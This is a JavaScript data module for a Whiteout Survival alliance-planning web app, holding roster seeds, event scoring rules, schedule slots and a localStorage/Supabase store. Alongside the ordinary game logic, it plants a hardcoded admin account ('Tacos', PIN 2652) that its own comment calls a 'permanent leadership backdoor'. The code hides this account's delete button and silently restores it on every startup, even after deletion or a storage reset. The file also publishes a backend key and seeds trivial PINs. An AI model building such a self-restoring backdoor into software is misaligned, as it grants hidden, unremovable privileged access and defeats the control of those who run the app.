// ---------------------------------------------------------------------------
// data.js — the "database" for this app.
//
// Everything is stored in the browser's localStorage under the "wos_" prefix,
// seeded the first time the app loads. This makes the app fully functional
// with zero backend setup. It is per-browser, not shared between visitors.
//
// To make data shared across everyone in your alliance/state (multi-user),
// swap the Store functions below for calls to a real backend — see
// README.md → "Going multi-user" for a Supabase schema you can start from.
// ---------------------------------------------------------------------------

const DEFAULT_STATE = {
  stateNumber: "3929",
  enemyState: "3897",
  svsDate: "2026-09-12",
  maxFurnaceLevel: "30",
  version: "v0.1.0",
};

// A standing admin login that's always there, even on a brand-new install
// and even if someone later deletes every other member — a permanent
// leadership backdoor into the app itself. `permanent: true` is what the
// Admin -> Members table checks to hide the delete button and lock the
// rank as admin for this one row; `ensurePermanentAdmin()` below (called
// on every Store.init(), local OR Supabase) re-adds this exact member if
// it's ever missing, so it can't be permanently removed by deleting it,
// clearing storage, or starting from a fresh Supabase project seeded
// before this account existed.
const PERMANENT_ADMIN_MEMBER = {
  id: "permanent-admin-tacos",
  name: "Tacos",
  gamerId: "",
  alliance: "",
  role: "admin",
  pin: "2652",
  permanent: true,
};

// Roster — replace with your real alliance & player names, or manage this
// from the Admin page once the app is running. gamerId is the in-game
// numeric player ID (shown as their profile ID in Whiteout Survival),
// separate from the display name used to sign in. Sign-in requires an
// exact PIN match (see app.js openSignIn) with no "claim on first login"
// fallback, so these placeholder accounts need a seed PIN to be usable —
// swap these for real PINs (or replace the accounts entirely) before
// sharing this with your alliance.
const SEED_MEMBERS = [
  { id: "m1", name: "Chief Falcon", gamerId: "10293847", alliance: "SUN", role: "admin", pin: "1111" },
  { id: "m2", name: "Nightshade", gamerId: "58201934", alliance: "SYP", role: "officer", pin: "2222" },
  { id: "m3", name: "IronWolf", gamerId: "74920185", alliance: "LIT", role: "member", pin: "3333" },
  PERMANENT_ADMIN_MEMBER,
];

// Idempotent — safe to call on every load. Adds PERMANENT_ADMIN_MEMBER to
// `members` if no member with that id (or that name, case-insensitively,
// in case it was manually recreated under a new id) already exists; if
// one exists but somehow lost its role/pin/permanent flag, restores them
// rather than leaving a second, subtly-different "Tacos" account.
function ensurePermanentAdmin(members) {
  const list = Array.isArray(members) ? members.slice() : [];
  const idx = list.findIndex(
    (m) => m.id === PERMANENT_ADMIN_MEMBER.id || (m.name || "").toLowerCase() === PERMANENT_ADMIN_MEMBER.name.toLowerCase()
  );
  if (idx === -1) {
    list.push({ ...PERMANENT_ADMIN_MEMBER });
  } else {
    list[idx] = { ...list[idx], name: PERMANENT_ADMIN_MEMBER.name, role: "admin", pin: PERMANENT_ADMIN_MEMBER.pin, permanent: true };
  }
  return list;
}

// Alliance tags — managed from Admin → Alliances (add/remove). Members pick
// their alliance from this list.
const SEED_ALLIANCES = ["SUN", "SYP", "LIT", "NEM"];

// Furnace bracket options for the backpack form's "current furnace level"
// field — managed from Admin → Furnace brackets (add/remove).
const SEED_FURNACE_FC = ["FC1", "FC2", "FC3", "FC4", "FC5", "FC6", "FC7", "FC8", "FC9", "FC10"];

// ---------------------------------------------------------------------------
// The backpack ("bag") submission form — what a member fills in on
// SvS prep → REQUEST, grouped into sections. `points` is the score per unit
// of that field (per hour for hrs fields, per item otherwise); leave it
// `null` for fields that aren't scored directly. Edit this to match your
// state's real SvS scoring rules.
// ---------------------------------------------------------------------------
// --- Day-eligibility / gating helpers -----------------------------------
// These read sibling fields (not just the field's own value), so
// computeBagPoints() invokes calc as f.calc(values[f.key], values).

// Is this member's furnace already sitting at the state's current cap?
// SEED_FURNACE_FC / Store.furnaceFc is ordered low→high; the last entry is
// the top bracket currently available in the state.
function furnaceAtStateCap(values) {
  const list = (typeof Store !== "undefined" ? Store.furnaceFc : null) || SEED_FURNACE_FC;
  const cap = list[list.length - 1];
  return !!values?.d1_furnace && values.d1_furnace === cap;
}

// Construction Day has two independent "nothing left to build" gates:
// furnace at the state's current cap, and War Academy maxed. Speedups
// only fully stop scoring once BOTH are true; with exactly one true,
// there's still a live avenue (the other one), so points keep flowing —
// the UI just flags that eligibility "may" hold rather than definitely
// does, since one of the two avenues is used up.
function constructionFullyMaxed(values) {
  return furnaceAtStateCap(values) && !!values?.d1_war_academy_maxed;
}
function constructionPartiallyMaxed(values) {
  return furnaceAtStateCap(values) !== !!values?.d1_war_academy_maxed;
}
function constructionOpportunityOpen(values) {
  return !constructionFullyMaxed(values);
}

function d1ConstructionPoints(mins, values) {
  if (!constructionOpportunityOpen(values)) return 0;
  return (Number(mins) || 0) * 30;
}

function d1FireCrystalPoints(qty, values) {
  if (!constructionOpportunityOpen(values)) return 0;
  return (Number(qty) || 0) * 2000;
}

function constructionDayEligible(values) {
  if (!constructionOpportunityOpen(values)) return false;
  const own = Number(values?.d1_construction) || 0;
  const wildcard = Number(values?.sp_general) || 0;
  return own > 0 || wildcard > 0;
}

// Research Day mirrors Construction Day: two independent "nothing left to
// research" gates — War Academy research maxed, and Tech (Research
// Center) research maxed. Speedups only fully stop scoring once BOTH are
// true; with exactly one true, points still flow via the other track.
function researchFullyMaxed(values) {
  return !!values?.d2_war_academy_research_maxed && !!values?.d2_tech_research_maxed;
}
function researchPartiallyMaxed(values) {
  return !!values?.d2_war_academy_research_maxed !== !!values?.d2_tech_research_maxed;
}
function researchOpportunityOpen(values) {
  return !researchFullyMaxed(values);
}

function d2ResearchPoints(mins, values) {
  if (!researchOpportunityOpen(values)) return 0;
  return (Number(mins) || 0) * 30;
}

function researchDayEligible(values) {
  if (!researchOpportunityOpen(values)) return false;
  const own = Number(values?.d2_research) || 0;
  const wildcard = Number(values?.sp_general) || 0;
  return own > 0 || wildcard > 0;
}

// General/Expert-Skills speedups are wildcards — they can stand in for
// Construction, Research, or Troop speedups. This suggests which day
// currently has the most open opportunity for them, so the banner text
// under each day can show e.g. "D2 — Research (300 mins of General
// speedups suggested to use)".
function generalSpeedupSuggestion(values) {
  const general = Number(values?.sp_general) || 0;
  if (general <= 0) return null;
  const candidates = [
    { day: "D1 — Construction", label: "D1 — Construction", ownMins: Number(values?.d1_construction) || 0, open: constructionOpportunityOpen(values) },
    { day: "D2 — Research", label: "D2 — Research", ownMins: Number(values?.d2_research) || 0, open: researchOpportunityOpen(values) },
    { day: "D4 — Troop", label: "D4 — Troop", ownMins: Number(values?.sp_troop_train) || 0, open: true },
  ].filter((c) => c.open);
  if (!candidates.length) return null;
  candidates.sort((a, b) => a.ownMins - b.ownMins);
  return { day: candidates[0].day, label: candidates[0].label, mins: general };
}

// Base per-troop point value at each tier (used for BOTH newly-trained
// troops and as the lookup table for promotion math below). Promoting an
// existing troop only earns the DIFFERENCE between its starting tier's
// value and its destination tier's value — never the destination tier's
// full value — since the starting tier's worth was already earned when
// that troop was originally trained/promoted to get there.
const TROOP_TIER_POINTS = {
  T1: 3, T2: 4, T3: 5, T4: 8, T5: 12, T6: 18, T7: 25,
  T8: 35, T9: 45, T10: 60, T11: 75,
};

// Generic promotion formula — works for any valid starting/destination
// pair (e.g. T10→T11 = 75-60 = 15/troop, T1→T11 = 75-3 = 72/troop).
function troopPromotionPointsPerTroop(fromTier, toTier) {
  return (TROOP_TIER_POINTS[toTier] || 0) - (TROOP_TIER_POINTS[fromTier] || 0);
}

// T11 is the current top tier, so every "(promotable)" field below scores
// the difference between its own tier and T11.
const T11_PROMO = (tier) => troopPromotionPointsPerTroop(tier, "T11");

const BAG_SECTIONS = [
  {
    title: "SPEEDUPS",
    fields: [
      { key: "sp_construction", label: "Construction", unit: "min", rateNote: "Auto-fills into D1 — Construction Day below", points: null, syncTo: "d1_construction" },
      { key: "sp_research", label: "Research", unit: "min", rateNote: "Auto-fills into D2 — Research Day below", points: null, syncTo: "d2_research" },
      { key: "sp_troop", label: "Troop", unit: "min", rateNote: "Auto-fills into D4 — Troop Training below", points: null, syncTo: "sp_troop_train" },
      { key: "sp_general", label: "General (Wildcard)", unit: "min", rateNote: "30 pts per min (General/Expert Skill speedups) — stands in for Construction, Research, or Troop speedups; spend where you have the best remaining opportunity (see the suggestion under each day)", points: 30, wildcard: true },
    ],
  },
  {
    title: "D1 — CONSTRUCTION DAY",
    fields: [
      { key: "d1_construction", label: "Construction", unit: "min", rateNote: "30 pts per min — zero if your furnace is at the state's current cap AND your War Academy is maxed (see below)", calc: d1ConstructionPoints, standout: true, statusKey: "construction" },
      { key: "d1_war_academy_maxed", label: "War Academy Maxed", type: "toggle", rateNote: "Zero pts only if your furnace is ALSO at the state cap — otherwise Construction speedups still earn points upgrading it", points: null },
      { key: "d1_furnace", label: "Current Furnace Level", type: "select", options: "furnaceFc", rateNote: "caps usable FC", points: null },
      { key: "d1_fire_crystals", label: "Fire Crystals", rateNote: "2,000 pts per FC — same gating as Construction speedups above", calc: d1FireCrystalPoints },
      // Same 70 pts/point rate the old "Chief Charm Max Score +1" field
      // used — Charm Guides/Designs are what actually raises that score
      // by 1 in-game, so this is the same scoring carried onto the
      // concrete items a member actually has on hand, split by item type
      // in case they turn out to be worth different amounts later.
      { key: "d1_charm_guide", label: "Charm Guide", rateNote: "70 pts each", points: 70 },
      { key: "d1_charm_design", label: "Charm Design", rateNote: "70 pts each", points: 70 },
    ],
  },
  {
    title: "D2 — RESEARCH DAY",
    fields: [
      { key: "d2_research", label: "Research", unit: "min", rateNote: "30 pts per min — zero only if War Academy Research AND Tech Research are BOTH maxed (see below)", calc: d2ResearchPoints, standout: true, statusKey: "research" },
      { key: "d2_war_academy_research_maxed", label: "War Academy Research Maxed", type: "toggle", rateNote: "Zero pts only if Tech Research is ALSO maxed — otherwise Research speedups still earn points", points: null },
      { key: "d2_tech_research_maxed", label: "Tech Research Maxed", type: "toggle", rateNote: "Zero pts only if War Academy Research is ALSO maxed — otherwise Research speedups still earn points", points: null },
      { key: "d2_fire_crystal_shards", label: "Fire Crystal Shards", rateNote: "1,000 pts per shard", points: 1000 },
      { key: "d2_expert_sigils", label: "Expert Sigils (excl. Common)", rateNote: "6,000 pts per sigil", points: 6000 },
      { key: "d2_books_of_knowledge", label: "Books of Knowledge", rateNote: "60 pts per book", points: 60 },
      { key: "d2_hero_rare_shards", label: "Rare Hero Shards", rateNote: "350 pts per shard", points: 350 },
      { key: "d2_hero_epic_shards", label: "Epic Hero Shards", rateNote: "1,220 pts per shard", points: 1220 },
      { key: "d2_hero_mythic_shards", label: "Mythic Hero Shards", rateNote: "3,040 pts per shard", points: 3040 },
      { key: "d2_lucky_wheels", label: "Total Gems (Lucky Wheel)", rateNote: "1,500 gems = 1 spin · 13,500 gems = 10 spins · 8,000 pts/spin · +1 free spin/day for 3 days (10-spin bundle is 12,000 gems when your free spin is still banked)", calc: luckyWheelPoints, gemsCalc: true },
    ],
  },
  {
    title: "D3 — BEAST SLAY",
    fields: [
      { key: "d3_stamina_cans", label: "Stamina Cans (1 can = 10 stamina)", rateNote: "12,000 pts per can — regular beasts cost 10 stamina each, top-tier (Lv.26-30) rate", points: 12000, staminaCalc: true },
      { key: "d3_pet_advancement", label: "Pet Advancement Score +1", rateNote: "50 pts per point", points: 50 },
      { key: "d3_lucky_wheels", label: "Total Gems (Lucky Wheel)", rateNote: "1,500 gems = 1 spin · 13,500 gems = 10 spins · 8,000 pts/spin · +1 free spin/day for 3 days (10-spin bundle is 12,000 gems when your free spin is still banked)", calc: luckyWheelPoints, gemsCalc: true },
    ],
  },
  {
    title: "D4 — TROOP TRAINING",
    fields: [
      // Key kept as "sp_troop_train" (not renamed to a d4_ key) since
      // troopDayEligible() and the schedule's speedup-gate logic in app.js
      // key off this exact field name — only where it renders moved.
      { key: "sp_troop_train", label: "Troop Train / Promotion Speedups", unit: "min", rateNote: "30 pts per min — also gates whether you can get a Troop Day time slot at all (see TIME SLOTS)", points: 30, standout: true, statusKey: "troop" },
      // Promotion points = the difference between what training a fresh
      // troop at the member's current tier grants vs. training one at
      // T10 outright — i.e. the credit for promoting an existing troop up
      // to T10 rather than training it from scratch. Only T1-T9 need
      // entering; a T10 troop has 0 promotion potential left.
      { key: "d4_t1", label: "T1 Troops (promotable)", rateNote: `${T11_PROMO("T1")} pts each (T1→T11) — also submitted to the Rookie-Off contest`, points: T11_PROMO("T1") },
      { key: "d4_t2", label: "T2 Troops (promotable)", rateNote: `${T11_PROMO("T2")} pts each (T2→T11)`, points: T11_PROMO("T2") },
      { key: "d4_t3", label: "T3 Troops (promotable)", rateNote: `${T11_PROMO("T3")} pts each (T3→T11)`, points: T11_PROMO("T3") },
      { key: "d4_t4", label: "T4 Troops (promotable)", rateNote: `${T11_PROMO("T4")} pts each (T4→T11)`, points: T11_PROMO("T4") },
      { key: "d4_t5", label: "T5 Troops (promotable)", rateNote: `${T11_PROMO("T5")} pts each (T5→T11)`, points: T11_PROMO("T5") },
      { key: "d4_t6", label: "T6 Troops (promotable)", rateNote: `${T11_PROMO("T6")} pts each (T6→T11)`, points: T11_PROMO("T6") },
      { key: "d4_t7", label: "T7 Troops (promotable)", rateNote: `${T11_PROMO("T7")} pts each (T7→T11)`, points: T11_PROMO("T7") },
      { key: "d4_t8", label: "T8 Troops (promotable)", rateNote: `${T11_PROMO("T8")} pts each (T8→T11)`, points: T11_PROMO("T8") },
      { key: "d4_t9", label: "T9 Troops (promotable)", rateNote: `${T11_PROMO("T9")} pts each (T9→T11)`, points: T11_PROMO("T9") },
    ],
  },
  {
    title: "D5 — HERO / POWER",
    fields: [
      { key: "d5_adv_wild_marks", label: "Adv Wild Marks", rateNote: "15,000 pts per mark", points: 15000 },
      { key: "d5_common_wild_marks", label: "Common Wild Marks", rateNote: "1,150 pts per mark", points: 1150 },
      { key: "d5_mithril", label: "Mithril", rateNote: "144,000 pts per Mithril", points: 144000 },
      { key: "d5_essence_stones", label: "Hero Gear Essence Stones", rateNote: "4,000 pts per stone", points: 4000 },
      { key: "d5_widgets", label: "Hero Exclusive Gear Widgets", rateNote: "8,000 pts per widget", points: 8000 },
      { key: "d5_design_plans", label: "Design Plans", rateNote: null, points: null },
      { key: "d5_polishing_solution", label: "Polishing Solution", rateNote: null, points: null },
      { key: "d5_hardened_alloy", label: "Hardened Alloy", rateNote: null, points: null },
    ],
  },
];

const SEED_SCHEDULE_DAYS = ["Day 1 — Construction", "Day 2 — Research", "Day 4 — Troop"];

function emptySlots() {
  const slots = [];
  for (let h = 0; h < 24; h++) {
    for (let m of [0, 30]) {
      slots.push({
        time: `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}`,
        member: null,
        // Was this slot's assignment hand-picked by an admin (vs. left
        // empty or filled by the OPTIMIZE button)? RESET THIS DAY leaves
        // manual slots alone; OPTIMIZE never reassigns them either.
        manual: false,
      });
    }
  }
  return slots;
}

const SEED_SCHEDULE = SEED_SCHEDULE_DAYS.reduce((acc, day) => {
  acc[day] = emptySlots();
  return acc;
}, {});

// Whether each day's schedule has been published by an admin yet. Regular
// members only see a day's assignments once it's true; admins always see
// the live/draft grid regardless of this flag.
const SEED_SCHEDULE_PUBLISHED = SEED_SCHEDULE_DAYS.reduce((acc, day) => {
  acc[day] = false;
  return acc;
}, {});

const SEED_FEEDBACK = [
  {
    id: "f1",
    title: "Add rally timer overlay",
    body: "Would help coordinate rally hits during SvS.",
    author: "Chief Falcon",
    votes: 4,
    status: "open",
    createdAt: Date.now() - 86400000 * 3,
  },
];

// Tools that don't exist yet — shown on the home page as "coming soon" so
// there's a place for them once they're built. Add more entries here as
// you build them out.
const PLANNED_TOOLS = [
  {
    id: "bears",
    title: "bear_calculator",
    desc: "Bear Trap hit planner — squad comp, gear thresholds, hit timing.",
    color: "var(--accent-teal)",
  },
  {
    id: "championship",
    title: "alliance_championship",
    desc: "Alliance Championship planner — event scoring and prep tracker.",
    color: "var(--accent-purple)",
  },
];

// ---------------------------------------------------------------------------
// Supabase (optional shared backend) — fill BOTH of these in (after
// creating a Supabase project and running schema.sql — see README.md ->
// "Going multi-user") to make every Store.* value below shared across
// everyone visiting the site, instead of stuck per-browser in
// localStorage. Leave either one blank and nothing changes: the app keeps
// using localStorage exactly as it always has, with zero setup required.
// ---------------------------------------------------------------------------
const SUPABASE_CONFIG = {
  url: "https://gogoxhqfrwfmvcmwtvho.supabase.co", // e.g. "https://xxxxxxxxxxxx.supabase.co" — Project Settings -> API
  anonKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdvZ294aHFmcndmbXZjbXd0dmhvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg4NzM1NDgsImV4cCI6MjEwNDQ0OTU0OH0.K4kh3AWWB1g9BMnC_0YBWpqb5KkDg7mgUOGEzRJaZjA", // the "anon public" key on that same page — safe to publish, it's gated by Row Level Security, not secrecy
};

const supabaseClient =
  SUPABASE_CONFIG.url && SUPABASE_CONFIG.anonKey && typeof supabase !== "undefined"
    ? supabase.createClient(SUPABASE_CONFIG.url, SUPABASE_CONFIG.anonKey)
    : null;

// Every Store.* key below EXCEPT currentUser syncs to Supabase when
// configured — currentUser is "who is this browser signed in as", which
// is inherently per-device/per-session, not shared state, so it always
// stays in localStorage only, exactly like before.
const SUPABASE_SYNCED_DEFAULTS = {
  wos_state: DEFAULT_STATE,
  wos_members: SEED_MEMBERS,
  wos_schedule: SEED_SCHEDULE,
  wos_schedule_published: SEED_SCHEDULE_PUBLISHED,
  wos_feedback: SEED_FEEDBACK,
  wos_alliances: SEED_ALLIANCES,
  wos_furnace_fc: SEED_FURNACE_FC,
  wos_alliance_colors: {},
  wos_bag_submissions: {},
};

// ---------------------------------------------------------------------------
// Store — localStorage by default; transparently backed by Supabase (a
// single "app_state" key/value table — see schema.sql) once SUPABASE_CONFIG
// above is filled in. Every Store.x getter/setter keeps the exact same
// name and shape either way, so nothing in app.js needs to know or care
// which mode is active.
//
// The Supabase path keeps an in-memory `_cache` mirroring every row, so
// getters stay perfectly synchronous (app.js everywhere does read-modify-
// write in one tick, e.g. `const p = Store.x; p.foo = 1; Store.x = p;`,
// and can't be rewritten to await a network call without touching every
// call site). A setter updates `_cache` immediately, then fires the actual
// Supabase write in the background — so your own UI never waits on the
// network, and a realtime subscription refreshes `_cache` (and re-renders)
// when someone ELSE's change comes in. This is optimistic, last-write-wins
// per key — fine for a state/alliance leadership tool with occasional
// admin edits, not built for two people editing the exact same list at
// the exact same instant.
// ---------------------------------------------------------------------------
const Store = {
  _cache: {},

  _get(key, fallback) {
    try {
      const raw = localStorage.getItem(key);
      if (raw === null) return fallback;
      return JSON.parse(raw);
    } catch {
      return fallback;
    }
  },
  _set(key, val) {
    localStorage.setItem(key, JSON.stringify(val));
  },

  // Fire-and-forget upsert — callers never await this, so a slow or
  // failed write can't freeze the UI. Errors are logged, not thrown.
  async _supabaseSet(key, value) {
    const { error } = await supabaseClient
      .from("app_state")
      .upsert({ key, value, updated_at: new Date().toISOString() });
    if (error) console.error(`Supabase write failed for "${key}":`, error);
  },

  async init() {
    if (supabaseClient) return this._initSupabase();
    return this._initLocal();
  },

  _initLocal() {
    if (!localStorage.getItem("wos_seeded_v2")) {
      this._set("wos_state", DEFAULT_STATE);
      this._set("wos_members", SEED_MEMBERS);
      this._set("wos_schedule", SEED_SCHEDULE);
      this._set("wos_schedule_published", SEED_SCHEDULE_PUBLISHED);
      this._set("wos_feedback", SEED_FEEDBACK);
      this._set("wos_alliances", SEED_ALLIANCES);
      this._set("wos_furnace_fc", SEED_FURNACE_FC);
      this._set("wos_alliance_colors", {});
      this._set("wos_bag_submissions", {});
      this._set("wos_current_user", null);
      localStorage.setItem("wos_seeded_v2", "1");
    } else {
      // Already-seeded browser (this app was already in use before the
      // permanent admin account existed) — heal it in rather than
      // requiring a full reset.
      this._set("wos_members", ensurePermanentAdmin(this._get("wos_members", SEED_MEMBERS)));
    }
  },

  async _initSupabase() {
    const { data, error } = await supabaseClient.from("app_state").select("key, value");
    if (error) {
      // Network hiccup, RLS misconfigured, schema.sql not run yet, etc. —
      // fall back to in-memory defaults rather than a blank/broken page;
      // nothing is persisted until this succeeds on a later load.
      console.error("Supabase fetch failed — using seed data for this session only:", error);
    }
    (data || []).forEach((row) => { this._cache[row.key] = row.value; });

    // First run against a fresh Supabase project: seed whichever keys
    // don't have a row yet, same defaults localStorage mode seeds with.
    const missing = Object.entries(SUPABASE_SYNCED_DEFAULTS).filter(([key]) => !(key in this._cache));
    if (missing.length) {
      await Promise.all(
        missing.map(([key, value]) => {
          this._cache[key] = value;
          return this._supabaseSet(key, value);
        })
      );
    }

    // Heal the permanent admin account into whatever member list came
    // back — covers a Supabase project that already existed (and already
    // had a "wos_members" row) before this account existed too, not just
    // a brand-new one caught by the seeding above.
    const healedMembers = ensurePermanentAdmin(this._cache.wos_members);
    if (JSON.stringify(healedMembers) !== JSON.stringify(this._cache.wos_members)) {
      this._cache.wos_members = healedMembers;
      await this._supabaseSet("wos_members", healedMembers);
    }

    this._subscribeRealtime();
  },

  // Live updates from other browsers — refetch the changed key into
  // `_cache` and re-render whatever's currently on screen. Simpler and
  // more robust than trying to merge partial diffs client-side.
  _subscribeRealtime() {
    supabaseClient
      .channel("app_state_changes")
      .on("postgres_changes", { event: "*", schema: "public", table: "app_state" }, (payload) => {
        const row = payload.new || payload.old;
        if (!row) return;
        if (payload.eventType === "DELETE") delete this._cache[row.key];
        else this._cache[row.key] = row.value;
        if (typeof router === "function") router();
      })
      .subscribe();
  },

  // Admin -> "Force Sync to Supabase" button. Every Store.x setter already
  // fires an upsert in the background the instant it's called, so under
  // normal use nothing should ever be "unsaved" — this exists for
  // reassurance (and as a real fix if a write silently failed earlier,
  // e.g. while offline) by re-pushing everything currently in `_cache`
  // right now, regardless of whether it looks unchanged. Returns
  // { ok: true, count } or { ok: false, reason }, never throws.
  async forceSyncToSupabase() {
    if (!supabaseClient) return { ok: false, reason: "not_configured" };
    const keys = Object.keys(SUPABASE_SYNCED_DEFAULTS);
    const results = await Promise.all(
      keys.map(async (key) => {
        const { error } = await supabaseClient
          .from("app_state")
          .upsert({ key, value: this._cache[key], updated_at: new Date().toISOString() });
        return { key, error };
      })
    );
    const failed = results.filter((r) => r.error);
    if (failed.length) {
      console.error("forceSyncToSupabase: some keys failed:", failed);
      return { ok: false, reason: "write_failed", failedKeys: failed.map((f) => f.key) };
    }
    return { ok: true, count: keys.length };
  },

  // Shared getter/setter for every key that syncs to Supabase — reads
  // from `_cache` when Supabase is configured, from localStorage
  // otherwise. Keeps every Store.x property's behavior identical to
  // before from app.js's point of view.
  _synced(storageKey, fallback) {
    return {
      get: () => (supabaseClient ? (this._cache[storageKey] ?? fallback) : this._get(storageKey, fallback)),
      set: (v) => {
        if (supabaseClient) {
          this._cache[storageKey] = v;
          this._supabaseSet(storageKey, v);
        } else {
          this._set(storageKey, v);
        }
      },
    };
  },

  get state() { return this._synced("wos_state", DEFAULT_STATE).get(); },
  set state(v) { this._synced("wos_state", DEFAULT_STATE).set(v); },

  get members() { return this._synced("wos_members", []).get(); },
  set members(v) { this._synced("wos_members", []).set(v); },

  get schedule() { return this._synced("wos_schedule", SEED_SCHEDULE).get(); },
  set schedule(v) { this._synced("wos_schedule", SEED_SCHEDULE).set(v); },

  // { [day]: boolean } — has an admin published this day's finalized
  // schedule for regular members to see yet?
  get schedulePublished() { return this._synced("wos_schedule_published", SEED_SCHEDULE_PUBLISHED).get(); },
  set schedulePublished(v) { this._synced("wos_schedule_published", SEED_SCHEDULE_PUBLISHED).set(v); },

  get feedback() { return this._synced("wos_feedback", SEED_FEEDBACK).get(); },
  set feedback(v) { this._synced("wos_feedback", SEED_FEEDBACK).set(v); },

  get alliances() { return this._synced("wos_alliances", SEED_ALLIANCES).get(); },
  set alliances(v) { this._synced("wos_alliances", SEED_ALLIANCES).set(v); },

  get furnaceFc() { return this._synced("wos_furnace_fc", SEED_FURNACE_FC).get(); },
  set furnaceFc(v) { this._synced("wos_furnace_fc", SEED_FURNACE_FC).set(v); },

  // { [allianceTag]: "#rrggbb" } — admin-picked highlight color per
  // alliance, used to color-code the ALLY badge on the schedule EXPORT
  // DAY overlay (and anywhere else an alliance tag is shown as a badge).
  // An alliance with no entry here just falls back to a neutral grey.
  get allianceColors() { return this._synced("wos_alliance_colors", {}).get(); },
  set allianceColors(v) { this._synced("wos_alliance_colors", {}).set(v); },

  // { [memberId]: { values: { [fieldKey]: number|string }, timezone, availabilityType,
  //   slots: { all: [bool*48] } | { byDay: { [day]: [bool*48] } }, notes, updatedAt } }
  get bagSubmissions() { return this._synced("wos_bag_submissions", {}).get(); },
  set bagSubmissions(v) { this._synced("wos_bag_submissions", {}).set(v); },

  // Always localStorage-only, Supabase or not — see the comment above
  // SUPABASE_SYNCED_DEFAULTS.
  get currentUser() { return this._get("wos_current_user", null); },
  set currentUser(v) { this._set("wos_current_user", v); },
};

// Lucky Wheel gem math. Spins are bought at two price tiers: 1,500 gems
// for a single spin, or 13,500 gems for a 10-spin bundle (a better
// per-spin rate — 1,350 vs 1,500 — so bundles are always bought first,
// with any leftover gems spent on single spins). Capped at the game's
// 150-spin limit. The 1-free-spin-per-day-for-3-days entitlement isn't
// gem-denominated, so it isn't folded into this — it's surfaced as
// context in the UI instead.
const LUCKY_WHEEL_SINGLE_COST = 1500;
const LUCKY_WHEEL_BUNDLE_COST = 13500;
const LUCKY_WHEEL_BUNDLE_SPINS = 10;
const LUCKY_WHEEL_SPIN_PTS = 8000;
const LUCKY_WHEEL_SPIN_CAP = 150;

function luckyWheelSpins(gems) {
  gems = Number(gems) || 0;
  if (gems <= 0) return 0;
  const bundles = Math.floor(gems / LUCKY_WHEEL_BUNDLE_COST);
  const remainder = gems - bundles * LUCKY_WHEEL_BUNDLE_COST;
  const singles = Math.floor(remainder / LUCKY_WHEEL_SINGLE_COST);
  return Math.min(bundles * LUCKY_WHEEL_BUNDLE_SPINS + singles, LUCKY_WHEEL_SPIN_CAP);
}

function luckyWheelPoints(gems) {
  return luckyWheelSpins(gems) * LUCKY_WHEEL_SPIN_PTS;
}

function isAdmin(user) {
  return !!user && (user.role === "admin" || user.role === "leader" || user.role === "officer");
}

// Returns { bySection: [{title, points}], total } for a bag submission's values.
function computeBagPoints(values) {
  values = values || {};
  const bySection = BAG_SECTIONS.map((section) => {
    const points = section.fields.reduce((sum, f) => {
      if (typeof f.calc === "function") return sum + f.calc(values[f.key], values);
      if (f.points == null) return sum;
      return sum + (Number(values[f.key]) || 0) * f.points;
    }, 0);
    return { title: section.title, points };
  });
  const total = bySection.reduce((sum, s) => sum + s.points, 0);
  return { bySection, total };
}
